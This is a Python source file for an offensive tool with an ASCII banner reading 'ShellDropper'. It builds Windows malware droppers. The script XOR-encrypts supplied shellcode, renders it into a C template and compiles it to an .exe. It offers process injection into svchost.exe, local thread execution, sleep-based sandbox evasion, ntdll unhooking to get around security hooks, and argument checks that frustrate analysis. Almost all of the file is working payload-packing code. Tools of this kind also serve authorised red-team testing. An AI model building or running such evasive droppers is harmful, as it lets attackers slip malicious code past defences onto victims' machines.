import os
import sys
import argparse
import itertools
import secrets

from jinja2 import Template


BANNER =  \
"""
.d8888b.  888               888 888 8888888b.  8888888b.   .d88888b.  8888888b.
d88P  Y88b 888               888 888 888  "Y88b 888   Y88b d88P" "Y88b 888   Y88b
Y88b.      888               888 888 888    888 888    888 888     888 888    888
 "Y888b.   88888b.   .d88b.  888 888 888    888 888   d88P 888     888 888   d88P
    "Y88b. 888 "88b d8P  Y8b 888 888 888    888 8888888P"  888     888 8888888P"
      "888 888  888 88888888 888 888 888    888 888 T88b   888     888 888
Y88b  d88P 888  888 Y8b.     888 888 888  .d88P 888  T88b  Y88b. .d88P 888
 "Y8888P"  888  888  "Y8888  888 888 8888888P"  888   T88b  "Y88888P"  888"""


TEMPLATE_FILE = "template.c"

def write_code(filename, content):
    """Writes the generated code to the given filename."""

    print("Writing code to '{}'...".format(filename));
    with open(filename, 'w') as f:
        f.write(content)
    print("Writing done!")


def invoke_compiler(src_file, dst_file, compiler, compiler_options):
    """Compiles the previously compiled code to a .exe binary."""

    print("Compiling '{}' to '{}'...".format(src_file, dst_file))
    res = os.system("'{}' '{}' -o '{}' {}".format(compiler, src_file, dst_file, compiler_options))
    if res == 0:
        print("Compiled successfully!")
    else:
        print("Error encountered while compiling.")
        sys.exit(-3)
    return res


def remove_code(filename):
    """Removes the temporary .c file."""
    os.remove(filename)


def encode_bytes_to_hex(data):
    """Encodes a given byte array to a hex string (\\x90\\x0A...)"""
    return "".join(map(lambda x: "\\x{0:0>2x}".format(x), data))


def encode_shellcode(key, shellcode):
    """Encrypts the shellcode with the given key.  All arguments are expected to be bytes."""
    encoded_bytes = [a ^ b for a, b in list(zip(shellcode, itertools.cycle(key)))]
    return encode_bytes_to_hex(encoded_bytes)


def load_bin_file(filename):
    """Loads a raw .bin file containing shellcode."""
    print("Loading code from file '{}'...".format(filename))
    with open(filename, 'rb') as f:
        return f.read()


def load_template(filename):
    with open(filename) as f:
        return f.read()


def generate_code(shellcode, key, config_options, template_file_path):
    """Generates the C++ code where the payload will be set."""

    # Calculates the actual length of the shellcode and the key.  There will always be 4 bytes received for every actual byte in the payload.
    shellcode_length = int(len(shellcode) / 4)
    key_length = int(len(key) / 4)

    template = Template(load_template(template_file_path))
    return template.render({"shellcode_length": shellcode_length,
                            "key_length": key_length,
                            "shellcode": shellcode,
                            "key": key,
                            "options": config_options})


def generate_random_key(length):
    """Generates a random string of length X."""
    return secrets.token_bytes(length)


def generate_nops(length):
    return b'\x90' * length


def convert_hex_string_to_bytes(string):
    """Converts an hex string (\x00\x00) to its actual bytearray representation."""
    mid = string.replace('\\x', '')
    return bytearray.fromhex(mid)

def self_dir():
    return os.path.dirname(os.path.realpath(__file__))

def main():

    # Prints the tool's banner.
    print(BANNER)

    # Arguments parser.
    parser = argparse.ArgumentParser(description="Generates droppers with an encrypted payload.")
    parser.add_argument('-o', '--output-file', default="poc", help='Name of the file to which the executable should be written.')
    parser.add_argument('-v', '--verbose', action='store_true', help='Increases verbosity.')

    parser.add_argument('--compiler', default="i686-w64-mingw32-gcc", help="Compiler that should be used.")
    parser.add_argument('--compiler-options', default="-s -O2", help="Compiler flags and options to pass in during the compilation program.")

    key_group = parser.add_mutually_exclusive_group()
    key_group.add_argument('--key-random', action='store_true', help="Generates a random string of bytes of the same size as the shellcode to encrypt the payload.")
    key_group.add_argument('--key-hex', help="Hex key to use in order to encrypt/decrypt the payload. (\\x0A\\x90\\x00...)")
    key_group.add_argument('--key-ascii', help="ASCII key to use in order to encrypt/decrypt the payload. ('secret_key')")

    source_group = parser.add_mutually_exclusive_group()
    source_group.add_argument('-sf', '--source-bin-file', help="Source file from which the shellcode should be loaded.  This is expected to be a raw file.")
    source_group.add_argument('-ss', '--source-hex-string', help="Hex string from which the payload should be provisioned. Ex: \\x90\\x65\\x23...")

    parser.add_argument('-lte', '--local-thread-execution', default=False, action='store_true', help="Run the shellcode in the dropper process.")

    parser.add_argument('-ri', '--remote-inject', default=False, action='store_true', help="If injecting in a remote process, this indicates the process to inject the shellcode into.")
    parser.add_argument('--remote-inject-executable', default="C:\\Windows\\System32\\svchost.exe", help="If injecting in a remote process, this indicates the process to inject the shellcode into.")

    parser.add_argument('--sleep-evasion', default=0, type=int, help="Sleeps for x seconds when the program is initially launched.")
    parser.add_argument('--unhook-dll', action='append', help="Unhooks the indicated DLLs at runtime (C:\\Windows\\System32\\ntdll.dll).")

    parser.add_argument('--arguments-count', default=0, type=int, help='Indicates the count of arguments that are expected. If this does not match, the process exits early.')

    parser.add_argument('--pre-nops', type=int, help="Preprends the shellcode with the given number of NOPs.")

    args = parser.parse_args()

    # Acquires the shellcode from one of the given sources.
    shellcode = None
    if args.source_bin_file:
        shellcode = load_bin_file(args.source_bin_file)
    elif args.source_hex_string:
        shellcode = convert_hex_string_to_bytes(args.source_hex_string)
    else:
        print("Error: either the -sf or the -ss option needs to be provided.")
        sys.exit(-2)

    # Adds the NOPs if requested.
    if args.pre_nops:
        print("Adding NOPs...")
        shellcode = generate_nops(args.pre_nops) + shellcode

    if args.verbose:
        print("Shellcode: {}".format(shellcode))
        print("Length of the shellcode: {}".format(len(shellcode)))

    if (args.remote_inject and not args.remote_inject_executable):
        print("Error: the remote-inject and remote-inject-executable options need to be provided together!")
        sys.exit(-4)

    # Acquires the encryption key from one of the given sources.
    key = None
    if args.key_random:
        key = generate_random_key(len(shellcode))
    elif args.key_hex:
        key = convert_hex_string_to_bytes(args.key_hex)
    elif args.key_ascii:
        key = args.key_ascii.encode('ascii')
    else:
        print("Error: either the --key or the --key-random argument needs to be provided.")
        sys.exit(-1)

    if args.verbose:
        print("Length of the key: {}".format(len(key)))

    # Encrypts the shellcode with the given key.
    hex_encrypted_shellcode = encode_shellcode(key, shellcode)

    # Ensures we have a hex key to set in our C++ Code.
    hex_key = encode_bytes_to_hex(key)

    if args.verbose:
        print("Encrypted shellcode:")
        print(hex_encrypted_shellcode)

    code_config = {}

    # Adds the sleep at the beginning of the execution.
    if args.sleep_evasion > 0:
        code_config["sleep_evasion"] = args.sleep_evasion

    # Adds an argument checking routine at the beginning of the main.
    if args.arguments_count > 0:
        code_config["check_arguments_count"] = True
        code_config["arguments_count"] = args.arguments_count

    # Adds the remote injection capability as required.
    if args.remote_inject and args.remote_inject_executable:
        code_config["remote_inject"] = args.remote_inject
        code_config["remote_inject_executable"] = args.remote_inject_executable
    # Otherwise, add the local thread execution.
    elif args.local_thread_execution:
        code_config["local_thread_execution"] = args.local_thread_execution
    else:
        print("No execution method set!  Please use a local thread execution or a remote process injection.")
        sys.exit(-2)

    # Gets the DLLs to be unhooked at runtime.
    if args.unhook_dll and len(args.unhook_dll) > 0:
        code_config["unhook_dll"] = args.unhook_dll

    # Creates our file names.
    template_path = os.path.join(self_dir(), TEMPLATE_FILE)
    c_file = "{}.c".format(args.output_file)
    exe_file = "{}.exe".format(args.output_file)

    # Generates the C++ code.
    generated_code = generate_code(hex_encrypted_shellcode, hex_key, code_config, template_path)

    # Writes the code to the .c file.
    write_code(c_file, generated_code)

    # Compiles the .c file to an executable.
    invoke_compiler(c_file, exe_file, args.compiler, args.compiler_options)

    # If we are not in verbose mode, we remove the temporary .c file.
    if not args.verbose:
        remove_code(c_file)


if __name__ == "__main__":
    main()
